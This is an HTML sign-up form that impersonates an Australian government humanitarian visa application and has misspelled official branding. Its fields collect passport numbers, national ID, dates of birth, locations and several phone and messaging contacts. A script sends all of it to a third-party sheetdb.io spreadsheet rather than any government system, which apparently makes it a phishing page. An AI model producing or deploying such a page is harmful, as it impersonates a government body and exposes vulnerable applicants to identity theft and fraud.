<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Australia Humaniterian Application/title>
    <link href="sample.css" rel="stylesheet"   >
</head>
<body>
    <form action="https://sheetdb.io/api/v1/toqc055vjah9e" method="post" id="sheetdb-form"  >
  <div class="form-grid">
    <h1>Sign Up</h1>
    <p>Governmnet of Australia ministry of home affaire.</p>
    <hr>

    <label for="firstName"><b>Name</b></label>
<input type="text" placeholder="Enter First Name" name="data[firstName]" required>

<label for="lastName"><b>Last Name</b></label>
<input type="text" placeholder="Enter Last Name" name="data[lastName]" required>

<label for="fatherName"><b>Father Name</b></label>
<input type="text" placeholder="Enter Father Name" name="data[fatherName]" required>

<label for="gFatherName"><b>G Father Name</b></label>
<input type="text" placeholder="Enter Grandfather Name" name="data[gFatherName]" required>

<label for="gender"><b>Gender</b></label>
<select name="data[gender]" required>
  <option value="" disabled selected>Select Gender</option>
  <option value="Male">Male</option>
  <option value="Female">Female</option>
  <option value="Other">Other</option>
</select>

<label for="province"><b>Province</b></label>
<input type="text" placeholder="Enter Province" name="data[province]" required>

<label for="nationalId"><b>National ID Number</b></label>
<input type="text" placeholder="Enter National ID Number" name="data[nationalId]" required>

<label for="dateOfBirth"><b>Date of Birth</b></label>
<input type="date" placeholder="Enter Date of Birth" name="data[dateOfBirth]" required>

<label for="passportNumber"><b>Passport Number</b></label>
<input type="text" placeholder="Enter Passport Number" name="data[passportNumber]" required>

<label for="dateOfIssue"><b>Date of Issue</b></label>
<input type="date" placeholder="Enter Date of Issue" name="data[dateOfIssue]" required>

<label for="dateOfExpiration"><b>Date of Expiration</b></label>
<input type="date" placeholder="Enter Date of Expiration" name="data[dateOfExpiration]" required>

<label for="currentLocation"><b>Current Location</b></label>
<input type="text" placeholder="Enter Current Location" name="data[currentLocation]" required>

<label for="livingLocation"><b>Living Location</b></label>
<input type="text" placeholder="Enter Living Location" name="data[livingLocation]" required>

<label for="email"><b>Email Address</b></label>
<input type="email" placeholder="Enter Email Address" name="data[email]" required>

<label for="phoneNumber"><b>Phone Number</b></label>
<input type="tel" placeholder="Enter Phone Number" name="data[phoneNumber]" required>

<label for="whatsappNumber"><b>WhatsApp Number</b></label>
<input type="tel" placeholder="Enter WhatsApp Number" name="data[whatsappNumber]" required>

<label for="telegramNumber"><b>Telegram Number</b></label>
<input type="tel" placeholder="Enter Telegram Number" name="data[telegramNumber]" required>

<label for="parentPhoneNumber"><b>Parent Phone No</b></label>
<input type="tel" placeholder="Enter Parent Phone Number" name="data[parentPhoneNumber]" required>


    <label>
      <input type="checkbox" checked="checked" name="remember" style="margin-bottom:15px"> Remember me
    </label>

    <p>By creating an account you agree to our <a href="#" style="color:dodgerblue">Terms & Privacy</a>.</p>

    <div class="clearfix">
      <button type="button" class="cancelbtn">Cancel</button>
      <button type="submit" class="signupbtn">Sign Up</button>
    </div>
  </div>
</form>

        <script>
            var form = document.getElementById('sheetdb-form');
        form.addEventListener("submit", e => {
          e.preventDefault();
          fetch(form.action, {
              method : "POST",
              body: new FormData(document.getElementById("sheetdb-form")),
          }).then(
              response => response.json()
          ).then((html) => {
            // you can put any JS code here
            window.open('d.html', '_blank');

          });
        });
        </script>


</body>
</html>
